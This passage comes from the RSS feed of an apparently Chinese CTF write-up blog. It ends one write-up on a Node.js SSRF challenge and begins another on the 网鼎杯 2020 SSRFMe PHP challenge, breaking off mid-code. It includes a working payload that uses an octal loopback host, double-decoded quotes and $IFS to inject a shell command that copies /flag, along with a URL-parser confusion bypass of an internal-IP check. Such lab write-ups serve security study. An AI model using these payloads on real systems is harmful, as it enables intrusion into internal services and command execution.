&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;router.post(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/debug&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(req, res, next) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    console.log(req.body);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(req.body.url &lt;span style=&#34;color:#ff79c6&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;undefined&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; u &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; req.body.url;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; urlObject&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;url.parse(u);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(blacklist.indexOf(urlObject.hostname) &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; dest&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;urlObject.href;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		request(dest,(err,result,body)=&amp;gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			res.json(body);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		})
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		res.json([]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;module.exports &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; router;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。&lt;/p&gt;
&lt;p&gt;如果没有找到匹配的字符串则返回 -1。&lt;/p&gt;
&lt;p&gt;child_process 新建子进程，从而执行 Unix 系统命令&lt;/p&gt;
&lt;p&gt;blacklist里屏蔽了一些ssrf绕过的方法，但是可以参考这篇文章绕过&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.secpulse.com/archives/65832.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.secpulse.com/archives/65832.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束&lt;/p&gt;
&lt;p&gt;二次解码：https://github.com/nodejs/node/blob/master/lib/url.js&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://proben1.github.io/C:/Users/Lenovo/Desktop/WUIAryqhfgd.png&#34; &gt;
		&lt;img src=&#34;https://proben1.github.io/C:/Users/Lenovo/Desktop/WUIAryqhfgd.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;WUIAryqhfgd&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;WUIAryqhfgd&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;也就是URL中表示用户名和密码的字段会被二次解码，可以通过%2527@来闭合引号&lt;/p&gt;
&lt;p&gt;代码大意：&lt;/p&gt;
&lt;p&gt;get：判断访问ip是否在&lt;code&gt;blacklist&lt;/code&gt;中，如果是本地访问就读取get参数中的&lt;code&gt;url&lt;/code&gt;参数，去除其中的单引号和双引号，然后用nodejs的&lt;code&gt;url.parse&lt;/code&gt;去解析。把解析后的url拼接到一条shell命令中执行。之后返回&lt;code&gt;/tmp/log&lt;/code&gt;文件中的内容。&lt;/p&gt;
&lt;p&gt;POST： 检测是否提交了url参数，若提交了该参数则会用&lt;code&gt;url.parse&lt;/code&gt;解析，然后判断其中的主机名字段是否在&lt;code&gt;blacklist&lt;/code&gt;中，不在的话，去使用GET方法请求&lt;code&gt;url&lt;/code&gt;参数中所提交的url，返回请求的内容。&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&amp;#34;url&amp;#34;:&amp;#34;http://0177.0.0.1:3000/debug?url=http://a%2527@a;cp$IFS/flag$IFS/tmp/log%00&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个样子：&lt;/p&gt;
&lt;p&gt;echo  &amp;lsquo;http://a&amp;rsquo;a;cp$IFS/flag$IFS/tmp/log%00&amp;rsquo;&amp;raquo;/tmp/log&lt;/p&gt;
</description>
        </item>
        <item>
        <title>[网鼎杯2020玄武组]SSRFMe</title>
        <link>https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme/</link>
        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme/</guid>
        <description>&lt;h2 id=&#34;网鼎杯-2020-玄武组ssrfme&#34;&gt;[网鼎杯 2020 玄武组]SSRFMe&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;check_inner_ip&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$match_result&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;preg_match(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#ff79c6&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$match_result&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;url fomat error&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;try&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url_parse&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;parse_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;catch&lt;/span&gt;(Exception &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$e&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;url fomat error&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$hostname&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url_parse&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;host&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ip&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;gethostbyname(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$hostname&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$int_ip&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;ip2long(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ip&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; ip2long(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;127.0.0.0&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$int_ip&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt; ip2long(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;10.0.0.0&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$int_ip&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt; ip2long(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;172.16.0.0&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$int_ip&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt; ip2long(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;192.168.0.0&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$int_ip&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;16&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;safe_request_url&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (check_inner_ip(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39; is inner ip&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; curl_init();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_URL, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_RETURNTRANSFER, &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_HEADER, &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$output&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; curl_exec(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result_info&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; curl_getinfo(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result_info&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;redirect_url&amp;#39;&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            safe_request_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result_info&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;redirect_url&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        curl_close(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        var_dump(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$output&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#ff79c6&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;empty&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        safe_request_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    highlight_file(__FILE__);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;// Please visit hint.php locally.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;大致就先让你访问/hint.php，但有个ip检测，不能是内网ip&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gethostbyname
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;获取ip地址&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;防御了xip.io这类利用dns解析的绕过方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip2long
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将ip地址转为整数，判断是否为内网网段&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;防御了&lt;code&gt;127.0.0.1/8&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但这里头肯定有问题，不然也不可能出这题，先搜搜$url_parse相关&lt;/p&gt;
&lt;p&gt;最终找到一篇&lt;a class=&#34;link&#34; href=&#34;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;翻译文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/86527&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.anquanke.com/post/id/86527&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;（静待20min）&lt;/p&gt;
&lt;p&gt;现在我们默认已经读过这篇文章了&lt;/p&gt;
&lt;p&gt;来，让我们试试文章里的curl与其他语言url解析器联合使用所出现的问题&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;?url=http://@127.0.0.1:80 @baidu.com/hint.php
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;很有自信，但是返回了个bool(false)………………&lt;/p&gt;
&lt;p&gt;为什么……直接搜wp，也是这个……留下了疑惑&lt;/p&gt;
&lt;p&gt;肯定在这一块，好好的抛啥异常……&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;try&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url_parse&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;parse_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;catch&lt;/span&gt;(Exception &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$e&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;url fomat error&amp;#39;&lt;/span&gt;);
